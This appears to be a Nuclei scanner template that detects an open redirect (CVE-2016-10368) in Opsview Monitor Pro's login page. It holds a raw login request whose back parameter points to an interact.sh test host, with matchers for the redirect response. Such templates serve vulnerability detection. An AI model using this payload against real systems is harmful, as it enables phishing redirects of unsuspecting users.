id: CVE-2016-10368

info:
  name: Opsview Monitor Pro - Open Redirect
  author: 0x_Akoko
  severity: medium
  description: |
    Opsview Monitor Pro before 5.1.0.162300841, before 5.0.2.27475, before 4.6.4.162391051, and 4.5.x without a certain 2016 security patch contains an open redirect vulnerability. An attacker can redirect users to arbitrary web sites and conduct phishing attacks via the back parameter to the login URI.
  reference:
    - https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18774
    - https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2016-016/?fid=8341
    - https://nvd.nist.gov/vuln/detail/CVE-2016-10368
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2016-10368
    cwe-id: CWE-601
  tags: cve,cve2016,redirect,opsview,authenticated

requests:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        login_username={{username}}&login_password={{password}}&login=&back=//www.interact.sh&app=OPSVIEW

    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)interact\.sh\/?(\/|[^.].*)?$' # https://regex101.com/r/L403F0/1

      - type: status
        status:
          - 302

# Enhanced by mp on 2022/10/12
